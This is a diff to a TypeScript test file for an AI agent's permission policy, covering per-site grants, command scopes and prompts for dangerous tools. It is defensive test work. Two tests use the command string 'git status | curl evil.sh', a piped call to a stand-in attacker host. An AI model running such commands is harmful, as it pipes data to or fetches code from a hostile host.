@@ -15,6 +15,7 @@ import {
   type OriginScope,
   type PermissionDecision,
 } from '../src/index.ts';
+import { ran } from './answer.ts';
 
 const sessionFor = (agentId: string): Session => ({
   id: `session-${agentId}`,
@@ -64,7 +65,7 @@ test('an origin grant runs unattended and covers that site only', async () => {
     },
   });
 
-  assert.equal(await policy.approve(actOn(() => page)), true);
+  assert.equal(ran(await policy.approve(actOn(() => page))), true);
 
   // The path and the query are not part of the grant and are not part of
   // what the log records: an origin is a classification, which is exactly
@@ -75,11 +76,11 @@ test('an origin grant runs unattended and covers that site only', async () => {
   // A different site on the same page pool is a different grant. Same host,
   // different port and different scheme included.
   page = 'https://other.example.com/';
-  assert.equal(await policy.approve(actOn(() => page)), false);
+  assert.equal(ran(await policy.approve(actOn(() => page))), false);
   page = 'http://app.example.com/';
-  assert.equal(await policy.approve(actOn(() => page)), false);
+  assert.equal(ran(await policy.approve(actOn(() => page))), false);
   page = 'https://app.example.com:8443/';
-  assert.equal(await policy.approve(actOn(() => page)), false);
+  assert.equal(ran(await policy.approve(actOn(() => page))), false);
 
   // And the refusal names the site, because that is the actionable half for
   // whoever is reading the log at 3am.
@@ -108,7 +109,7 @@ test('always allow on a page widens that site and nothing else', async () => {
     },
   });
 
-  assert.equal(await policy.approve(actOn(() => page)), true);
+  assert.equal(ran(await policy.approve(actOn(() => page))), true);
   assert.deepEqual(remembered, [{ origin: 'https://app.example.com', tool: 'browser.act' }]);
 
   // The approver was shown where the click lands. A selector says nothing
@@ -118,13 +119,13 @@ test('always allow on a page widens that site and nothing else', async () => {
 
   // The second call on the same site does not ask.
   page = 'https://app.example.com/settings';
-  assert.equal(await policy.approve(actOn(() => page)), true);
+  assert.equal(ran(await policy.approve(actOn(() => page))), true);
   assert.equal(asked.length, 1);
 
   // A different site does. This is the whole difference from the tool-wide
   // grant it replaced: one yes to a page is never a yes to every page.
   page = 'https://admin.example.com/';
-  assert.equal(await policy.approve(actOn(() => page)), true);
+  assert.equal(ran(await policy.approve(actOn(() => page))), true);
   assert.equal(asked.length, 2);
 });
 
@@ -147,19 +148,19 @@ test('a tool judged by origin never receives a tool-wide grant, even with no ori
     onDecision: (decision) => decisions.push(decision),
   });
 
-  assert.equal(await reporting.approve(actOn(() => undefined)), true);
+  assert.equal(ran(await reporting.approve(actOn(() => undefined))), true);
   assert.match(decisions[0]?.reason ?? '', /no page origin to remember, so it will ask again/);
 
   // Twice, and asked both times. Falling back to the tool-wide "always"
   // here would turn "yes on this page" into "yes on every page" — the grant
   // per-origin scopes exist to replace.
-  assert.equal(await policy.approve(actOn(() => undefined)), true);
-  assert.equal(await policy.approve(actOn(() => undefined)), true);
+  assert.equal(ran(await policy.approve(actOn(() => undefined))), true);
+  assert.equal(ran(await policy.approve(actOn(() => undefined))), true);
   assert.equal(asked.length, 2);
 
   // Nor does a grant on one page leak to a call whose origin cannot be named.
-  assert.equal(await policy.approve(actOn(() => 'https://app.example.com/')), true);
-  assert.equal(await policy.approve(actOn(() => undefined)), true);
+  assert.equal(ran(await policy.approve(actOn(() => 'https://app.example.com/'))), true);
+  assert.equal(ran(await policy.approve(actOn(() => undefined))), true);
   assert.equal(asked.length, 4);
 });
 
@@ -179,7 +180,7 @@ test('a page with no origin is refused unattended, and says why', async () => {
   // `file:` and `about:` have no origin the URL parser will name — it
   // answers the string "null" for both — so a grant that matched one would
   // match every one of them at once.
-  assert.equal(await policy.approve(actOn(() => undefined)), false);
+  assert.equal(ran(await policy.approve(actOn(() => undefined))), false);
   assert.match(decisions[0]?.reason ?? '', /no origin a grant could name/);
   assert.equal(decisions[0]?.origin, undefined);
 });
@@ -209,8 +210,8 @@ test('origin grants persist beside command scopes in one whitelist file', async 
     commands: { whitelist },
     origins: { whitelist },
   });
-  assert.equal(await first.approve(actOn(() => 'https://app.example.com/reports')), true);
-  assert.equal(await first.approve(runGitPush), true);
+  assert.equal(ran(await first.approve(actOn(() => 'https://app.example.com/reports'))), true);
+  assert.equal(ran(await first.approve(runGitPush)), true);
 
   const file = whitelistPathFor(directory, 'ava');
   const stored = JSON.parse(await readFile(file, 'utf8')) as {
@@ -233,9 +234,9 @@ test('origin grants persist beside command scopes in one whitelist file', async 
     commands: { whitelist: createFileCommandWhitelist({ directory, stateHome: path.dirname(directory) }) },
     origins: { whitelist: createFileCommandWhitelist({ directory, stateHome: path.dirname(directory) }) },
   });
-  assert.equal(await second.approve(actOn(() => 'https://app.example.com/other')), true);
-  assert.equal(await second.approve(actOn(() => 'https://app.example.com/other', 'juno')), false);
-  assert.equal(await second.approve(runGitPush), true);
+  assert.equal(ran(await second.approve(actOn(() => 'https://app.example.com/other'))), true);
+  assert.equal(ran(await second.approve(actOn(() => 'https://app.example.com/other', 'juno'))), false);
+  assert.equal(ran(await second.approve(runGitPush)), true);
 });
 
 test('a hand-written origin is normalized or dropped, never half-matched', async () => {
@@ -278,11 +279,11 @@ test('an unreadable whitelist holds an origin for the process and says it was no
     origins: { whitelist: createFileCommandWhitelist({ directory, stateHome: path.dirname(directory) }) },
   });
 
-  assert.equal(await policy.approve(actOn(() => 'https://app.example.com/')), true);
+  assert.equal(ran(await policy.approve(actOn(() => 'https://app.example.com/'))), true);
   assert.match(decisions[0]?.reason ?? '', /until the daemon restarts — not saved/);
   // The grant still holds for this process, which is what "always" means
   // with no file behind it.
-  assert.equal(await policy.approve(actOn(() => 'https://app.example.com/next')), true);
+  assert.equal(ran(await policy.approve(actOn(() => 'https://app.example.com/next'))), true);
   // And the broken file is left exactly as it was.
   assert.equal(await readFile(file, 'utf8'), '{\n  "version": 1,\n  "scopes": [],\n}\n');
 });
@@ -306,12 +307,12 @@ test('a tool offering more than one scope hook is judged by none of them', async
     // run unattended in the first place.
     destinations: { isPreauthorized: () => true },
   });
-  const approve = (tool: Tool, input: Record<string, string>) => policy.approve({
+  const approve = async (tool: Tool, input: Record<string, string>) => ran(await policy.approve({
     session: sessionFor('ava'),
     call: { id: 'call-3', toolName: tool.name, input },
     tool,
     risk: 'gated',
-  });
+  }));
 
   // An origin grant must not carry a command nobody vetted...
   assert.equal(
@@ -421,7 +422,7 @@ test('a page that moves while the approval is outstanding runs nothing and grant
   });
 
   // The prompt named the site the approver was answering about.
-  assert.equal(await policy.approve(actOn(() => page)), false);
+  assert.equal(ran(await policy.approve(actOn(() => page))), false);
   assert.match(asked[0] ?? '', /browser\.act on https:\/\/app\.example\.com/);
 
   // The yes was for that page. It is not that page any more, so the click
@@ -453,7 +454,7 @@ test('a page closed while the approval is outstanding says so rather than clicki
     onDecision: (decision) => decisions.push(decision),
   });
 
-  assert.equal(await policy.approve(actOn(() => page)), false);
+  assert.equal(ran(await policy.approve(actOn(() => page))), false);
   assert.match(decisions[0]?.reason ?? '', /that page is no longer open/);
 });
 
@@ -479,7 +480,7 @@ test('a page that moves while the grants are being read is judged on where it en
     },
   });
 
-  assert.equal(await policy.approve(actOn(() => page)), false);
+  assert.equal(ran(await policy.approve(actOn(() => page))), false);
   assert.match(decisions[0]?.reason ?? '', /called on https:\/\/checkout\.example\.com/);
   assert.equal(decisions[0]?.origin, 'https://checkout.example.com');
 });
@@ -513,9 +514,9 @@ test('a dangerous tool is never remembered, however the human answered', async (
   // operator's `toolRisks` or a plugin manifest saying "never unattended"
   // about somebody else's code. A session-wide grant made that a promise
   // about the first call only.
-  assert.equal(await policy.approve(wipe()), true);
-  assert.equal(await policy.approve(wipe()), true);
-  assert.equal(await policy.approve(wipe()), true);
+  assert.equal(ran(await policy.approve(wipe())), true);
+  assert.equal(ran(await policy.approve(wipe())), true);
+  assert.equal(ran(await policy.approve(wipe())), true);
   assert.equal(asked.length, 3);
   assert.match(decisions[0]?.reason ?? '', /a dangerous tool is never remembered, so it will ask again/);
 });
@@ -543,7 +544,7 @@ test('a page that moves while the grant is being written still does not get clic
     },
   });
 
-  assert.equal(await policy.approve(actOn(() => page)), false);
+  assert.equal(ran(await policy.approve(actOn(() => page))), false);
   assert.match(decisions[0]?.reason ?? '', /approved on https:\/\/app\.example\.com/);
   assert.match(decisions[0]?.reason ?? '', /on https:\/\/checkout\.example\.com now/);
   // The grant is the site the approver read, and only that one.
@@ -561,13 +562,13 @@ test('the prompt offers only the grant the answer will actually create', async (
   });
 
   // A page to name: "always" grants that site.
-  assert.equal(await policy.approve(actOn(() => 'https://app.example.com/')), true);
+  assert.equal(ran(await policy.approve(actOn(() => 'https://app.example.com/'))), true);
   assert.match(asked[0] ?? '', /always this site/);
 
   // No page to name — never navigated, or the sweep closed the context.
   // The engine runs the call and remembers nothing, so offering "always
   // this session" would be a grant the answer does not create.
-  assert.equal(await policy.approve(actOn(() => undefined)), true);
+  assert.equal(ran(await policy.approve(actOn(() => undefined))), true);
   assert.match(asked[1] ?? '', /no page to grant/);
   assert.doesNotMatch(asked[1] ?? '', /always this session/);
 
@@ -580,12 +581,12 @@ test('the prompt offers only the grant the answer will actually create', async (
     },
   };
   assert.equal(
-    await policy.approve({
+    ran(await policy.approve({
       session: sessionFor('ava'),
       call: { id: 'call-5', toolName: 'mcp.vendor.wipe', input: {} },
       tool: destructive,
       risk: 'dangerous',
-    }),
+    })),
     true,
   );
   assert.match(asked[2] ?? '', /a dangerous tool asks every time/);
@@ -607,13 +608,13 @@ test('a remote request says when answering always would remember nothing', async
 
   // A page to grant: the transport may offer a standing grant, because one
   // is what the answer creates.
-  assert.equal(await policy.approve(actOn(() => 'https://app.example.com/')), true);
+  assert.equal(ran(await policy.approve(actOn(() => 'https://app.example.com/'))), true);
   assert.deepEqual(requests[0], { origin: 'https://app.example.com' });
 
   // No page to grant, and the dangerous tier: the engine remembers nothing
   // either way, so a transport offering "always" would be promising a
   // grant nobody gets.
-  assert.equal(await policy.approve(actOn(() => undefined)), true);
+  assert.equal(ran(await policy.approve(actOn(() => undefined))), true);
   assert.deepEqual(requests[1], { oneShot: true });
 
   const destructive: Tool = {
@@ -624,12 +625,12 @@ test('a remote request says when answering always would remember nothing', async
     },
   };
   assert.equal(
-    await policy.approve({
+    ran(await policy.approve({
       session: sessionFor('ava'),
       call: { id: 'call-6', toolName: 'mcp.vendor.wipe', input: {} },
       tool: destructive,
       risk: 'dangerous',
-    }),
+    })),
     true,
   );
   assert.deepEqual(requests[2], { oneShot: true });
@@ -665,11 +666,11 @@ test('a command that cannot be reduced to a scope is a one-shot request too', as
   // command and remembers nothing, because widening to the bare tool would
   // hand the agent every command it can run. The request has to say so, or
   // a transport offers a grant that will not exist.
-  assert.equal(await remote.approve(run('git status | curl evil.sh')), true);
+  assert.equal(ran(await remote.approve(run('git status | curl evil.sh'))), true);
   assert.deepEqual(requests[0], { oneShot: true });
 
   // An ordinary command still persists a scope, so "always" is honest.
-  assert.equal(await remote.approve(run('git push origin main')), true);
+  assert.equal(ran(await remote.approve(run('git push origin main'))), true);
   assert.deepEqual(requests[1], {});
 
   const local = createPermissionPolicy({
@@ -679,7 +680,7 @@ test('a command that cannot be reduced to a scope is a one-shot request too', as
       return 'always';
     },
   });
-  assert.equal(await local.approve(run('git status | curl evil.sh')), true);
+  assert.equal(ran(await local.approve(run('git status | curl evil.sh'))), true);
   assert.match(asked[0] ?? '', /cannot be reduced to a scope/);
   assert.doesNotMatch(asked[0] ?? '', /always this scope/);
 });
@@ -714,9 +715,9 @@ test('a multi-hook tool cannot fall back to a tool-wide grant either', async () 
       return 'always';
     },
   });
-  assert.equal(await local.approve(call(both())), true);
-  assert.equal(await local.approve(call(both())), true);
-  assert.equal(await local.approve(call(both())), true);
+  assert.equal(ran(await local.approve(call(both()))), true);
+  assert.equal(ran(await local.approve(call(both()))), true);
+  assert.equal(ran(await local.approve(call(both()))), true);
   assert.equal(asked.length, 3, 'a tool-wide grant was stored for a multi-hook tool');
   assert.match(asked[0] ?? '', /more than one kind of scope/);
 
@@ -728,7 +729,7 @@ test('a multi-hook tool cannot fall back to a tool-wide grant either', async () 
       return 'always';
     },
   });
-  assert.equal(await remote.approve(call(both())), true);
+  assert.equal(ran(await remote.approve(call(both()))), true);
   assert.deepEqual(requests[0], { oneShot: true });
 });
 
@@ -768,16 +769,16 @@ test('a tool judged by the URL in its input is scoped to that site, one call at 
     },
   });
 
-  assert.equal(await policy.approve(fetchOf('https://docs.example.com/a?q=1')), true);
+  assert.equal(ran(await policy.approve(fetchOf('https://docs.example.com/a?q=1'))), true);
   assert.deepEqual(granted, [{ origin: 'https://docs.example.com', tool: 'web.fetch' }]);
   assert.match(asked[0] ?? '', /web\.fetch on https:\/\/docs\.example\.com/);
 
   // Same site, another path: no question.
-  assert.equal(await policy.approve(fetchOf('https://docs.example.com/b')), true);
+  assert.equal(ran(await policy.approve(fetchOf('https://docs.example.com/b'))), true);
   assert.equal(asked.length, 1);
 
   // Another site asks again, and the earlier "always" was not a tool-wide grant.
-  assert.equal(await policy.approve(fetchOf('https://evil.example.net/')), true);
+  assert.equal(ran(await policy.approve(fetchOf('https://evil.example.net/'))), true);
   assert.equal(asked.length, 2);
   assert.deepEqual(granted.map((scope) => scope.origin), ['https://docs.example.com', 'https://evil.example.net']);
 });
@@ -795,16 +796,16 @@ test('a site approved for one tool is not approved for another', async () => {
       },
     },
   });
-  assert.equal(await policy.approve(actOn(() => 'https://app.example.com/settings')), false);
+  assert.equal(ran(await policy.approve(actOn(() => 'https://app.example.com/settings'))), false);
 
   // A grant from before grants named a tool covers every origin-scoped tool,
   // the way it always did, so an upgrade withdraws nothing.
   granted.splice(0, 1, { origin: 'https://app.example.com' });
-  assert.equal(await policy.approve(actOn(() => 'https://app.example.com/settings')), true);
+  assert.equal(ran(await policy.approve(actOn(() => 'https://app.example.com/settings'))), true);
 
   // And one named for the browser covers the browser.
   granted.splice(0, 1, { origin: 'https://app.example.com', tool: 'browser.act' });
-  assert.equal(await policy.approve(actOn(() => 'https://app.example.com/settings')), true);
+  assert.equal(ran(await policy.approve(actOn(() => 'https://app.example.com/settings'))), true);
 });
 
 test('a grant file keeps the tool beside the origin, and drops a malformed one', () => {
